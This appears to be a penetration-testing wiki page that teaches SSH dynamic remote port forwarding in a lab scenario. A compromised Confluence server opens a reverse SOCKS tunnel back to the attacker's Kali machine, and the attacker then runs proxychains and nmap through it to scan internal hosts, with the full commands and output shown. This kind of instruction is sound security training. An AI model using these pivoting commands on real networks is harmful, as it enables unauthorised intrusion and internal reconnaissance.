---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# SSH Dynamic Remote Port Forwarding

Similar to [SSH Local Port Forwarding](ssh-local-port-forwarding.md), [SSH Remote Port Forwarding](ssh-remote-port-forwarding.md) allows connections on a one-socket-per-connection basis. While this is useful, it can become tedious to set up a new socket for each port the attacker wants to explore. Also it makes things like port scanning very difficult.

Luckily **SSH Dynamic Remote Port Forwarding**, can solve this problem much like [local dynamic port forwarding](ssh-dynamic-port-forwarding.md) did for local port forwarding.

As suggested by the name, remote dynamic port forwarding creates a _dynamic port forward_ in the _remote_ configuration. The SOCKS proxy port is _bound to the SSH server_, and traffic is _forwarded from the SSH client_.

## Command Structure

The command structure is similar to what was used with remote port forwarding. The `ssh` command is again used with the [`-R`](https://man.openbsd.org/ssh#R) flag. However only a remote port (and optionally address) are provided after `-R`. This is in contrast to SSH remote port forwarding where a destination address and port are also provided. The structure looks like this:

```bash
ssh -R <remote_address:><remote_port> <username>@<ssh_server>
```

* `remote_address` is an optional argument and can be removed

To create a reverse tunnel to port `4444` of `192.168.100.25` the command would be:

```bash
ssh -R 4444 user@192.168.100.25
```

To specify that the listener should exist on the internal interface only the command would be:

```bash
ssh -R 127.0.0.1:4444 user@192.168.100.25
```

Please note this functionality was added in [OpenSSH 7.6](https://www.openssh.com/txt/release-7.6) in 2017. Older OpenSSH clients do not have this ability.

## Example Scenario

The scenario will be the same as in the remote port forwarding [example](ssh-remote-port-forwarding.md#example-scenario). The overall network structure is similar to all of the SSH tunneling examples, there is a Confluence web server at the network perimeter (`CONFLUENCE01`). This server is behind a firewall configured to restrict inbound traffic only to TCP port 8090 (for the web server), but to allow all outbound traffic. This means an outbound SSH connection will be allowed and thus a dynamic remote forward can be set up. Once created that will look like this:

### Setting Up the Remote Forward

The initial compromise is the same as previous examples:

1. Spawn a standard reverse shell on `CONFLUENCE01` with CVE-2022-26134 exploit shown [here](../simple-port-forwarding-scenario.md#cve-2022-26134)
2. Stabilize the shell with the technique demonstrated [here](../../shells/reverse-shell/netcat.md#simplified)

#### Set Up SSH Server

The SSH server must be running on the attacker's Kali machine. The steps are the same as shown [here](ssh-remote-port-forwarding.md#setting-up-the-ssh-server). First the SSH server is started with:

```bash
sudo systemctl start ssh.service
```

If desired, it is possible to verify the server is listening with the command:

```bash
ss -ntplu
```

And checking that the SSH process is listening at port 22:

```
kali@kali:~$ ss -ntplu                         
Netid  State   Recv-Q  Send-Q   Local Address:Port     Peer Address:Port  Process                                                                                   
tcp    LISTEN  0       128            0.0.0.0:22            0.0.0.0:*                                                
tcp    LISTEN  0       128               [::]:22               [::]:*
```

#### Set Up SSH Client

In this scenario, `CONFLUENCE01` will be the SSH client. The command to open the connection back to the attacker's machine is:

```bash
ssh -N -R 9998 remote-ssh@192.168.45.159
```

* Optionally the listener can be limited to the internal loopback interface by setting `127.0.0.1` as the remote address with `-R 127.0.0.1:9998`

This command returns no output (because of `-N`), but will ask for the `remote-ssh` user's password. Once entered the command occupies the shell but does not return:

```bash
confluence@confluence01:/opt/atlassian/confluence/bin$ ssh -N -R 9998 remote-ssh@192.168.45.159
Could not create directory '/home/confluence/.ssh'.
The authenticity of host '192.168.45.159 (192.168.45.159)' can't be established.
ECDSA key fingerprint is SHA256:twy9QO8IpFFoKforRFBiVTNk/qjqxyp8qnFTnBUcqZs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
remote-ssh@192.168.45.159's password: 

```

The success of creating the listener can be verified on the attacker's machine with the `ss` command again:

```
$ ss -ntplu             
Netid  State   Recv-Q  Send-Q   Local Address:Port     Peer Address:Port  Process
tcp    LISTEN  0       128            0.0.0.0:22            0.0.0.0:*
tcp    LISTEN  0       128          127.0.0.1:9998          0.0.0.0:*
tcp    LISTEN  0       128               [::]:22               [::]:*
```

Note the listener on `9998`. The `ssh` command on `CONFLUENCE01` was run with `-R 127.0.0.1:9998` to specify a bind interface.

### Using the Tunnel

As seen with [dynamic local port forwarding](ssh-dynamic-port-forwarding.md), the SSH client acts as a [SOCKS proxy server](https://securityintelligence.com/posts/socks-proxy-primer-what-is-socks5-and-why-should-you-use-it/) in dynamic forwarding. Therefore all traffic must be in a SOCKS-compliant format. Proxychains can be used for this purpose just as in the dynamic local forwarding [example](ssh-dynamic-port-forwarding.md#proxychains).

#### Configuring Proxychains

The /etc/proxychains4.conf file must be modified to list the current proxy connection. In this instance, the last line needs to be set to:

```
socks5 127.0.0.1 9998
```

Once completed the modified file will look like this:

{% code title="proxychains4.conf" %}
```
...
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 9998
```
{% endcode %}

#### Using Proxychains

Now that it is properly configured, traffic can be sent through the SOCKS proxy by prepending commands with proxychains. For example to run an Nmap scan against a host found at `10.4.190.215` the command would be:

{% code overflow="wrap" %}
```bash
proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.190.215
```
{% endcode %}

A similar command, except it scans ports `9061` to `9064` instead of the top 20, was run against the lab machines generating the following output:

```bash
kali@kali:~$ proxychains nmap -sT -p9061-9063 -vvv 10.4.190.64 -T 3
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-31 15:28 MST
Initiating Ping Scan at 15:28
Scanning 10.4.190.64 [2 ports]
[proxychains] Strict chain  ...  127.0.0.1:9998  ...  10.4.190.64:80  ...  OK
Completed Ping Scan at 15:28, 0.17s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:28
Completed Parallel DNS resolution of 1 host. at 15:28, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 15:28
Scanning 10.4.190.64 [3 ports]
[proxychains] Strict chain  ...  127.0.0.1:9998  ...  10.4.190.64:9061 <--socket error or timeout!
adjust_timeouts2: packet supposedly had rtt of 15459453 microseconds.  Ignoring time.
[proxychains] Strict chain  ...  127.0.0.1:9998  ...  10.4.190.64:9062  ...  OK
Discovered open port 9062/tcp on 10.4.190.64
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
[proxychains] Strict chain  ...  127.0.0.1:9998  ...  10.4.190.64:9063 <--socket error or timeout!
adjust_timeouts2: packet supposedly had rtt of 15285522 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of 15285522 microseconds.  Ignoring time.
Completed Connect Scan at 15:29, 31.33s elapsed (3 total ports)
Nmap scan report for 10.4.190.64
Host is up, received syn-ack (0.22s latency).
Scanned at 2024-01-31 15:28:34 MST for 31s

PORT     STATE  SERVICE REASON
9061/tcp closed unknown conn-refused
9062/tcp open   unknown syn-ack
9063/tcp closed unknown conn-refused

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 31.59 seconds
```

Also be warned if the SSH client terminal window is still open, it may look scary:

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ssh -N -R 9998 remote-ssh@192.168.45.159
Could not create directory '/home/confluence/.ssh'.
The authenticity of host '192.168.45.159 (192.168.45.159)' can't be established.
ECDSA key fingerprint is SHA256:twy9QO8IpFFoKforRFBiVTNk/qjqxyp8qnFTnBUcqZs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
remote-ssh@192.168.45.159's password: 
connect_to 10.4.190.64 port 9061: failed.
channel 1: chan_write_failed for ostate 3
connect_to 10.4.190.64 port 9063: failed.
channel 1: chan_write_failed for ostate 3
```

This is just the network traffic of failed scan traffic. Note the port found to be open, `9062`, generated no error message.
